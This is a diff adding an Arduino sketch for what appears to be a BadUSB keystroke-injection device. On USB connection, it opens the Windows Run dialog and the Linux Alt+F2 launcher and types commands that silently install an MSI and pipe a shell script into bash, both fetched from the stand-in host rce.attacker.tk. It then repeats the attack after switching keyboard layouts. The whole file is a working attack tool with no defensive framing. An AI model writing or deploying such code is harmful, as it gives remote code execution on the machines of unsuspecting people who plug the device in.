@@ -1,0 +1,45 @@
+void windows_run() {
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(250);
+  Keyboard.releaseAll();
+  Keyboard.print("msiexec /i http://rce.attacker.tk/1.msi /quiet");
+  delay(100);
+  Keyboard.write(KEY_RETURN);
+}
+
+void linux_run() {
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F2);
+  delay(250);
+  Keyboard.releaseAll();
+  Keyboard.print("curl -L http://rce.attacker.tk/1.sh|bash -");
+  delay(100);
+  Keyboard.write(KEY_RETURN);
+}
+
+void rce() {
+  windows_run();
+  delay(100);
+  linux_run();
+  delay(100);
+}
+
+void switchLang() {
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_LEFT_ALT);
+  delay(100);
+  Keyboard.releaseAll();
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_LEFT_CTRL);
+  delay(100);
+  Keyboard.releaseAll();
+}
+
+void setup() { // Will be executed when the device is connected via USB
+  Keyboard.begin();
+  delay(2000);
+  rce();
+  switchLang();
+  rce();
+}
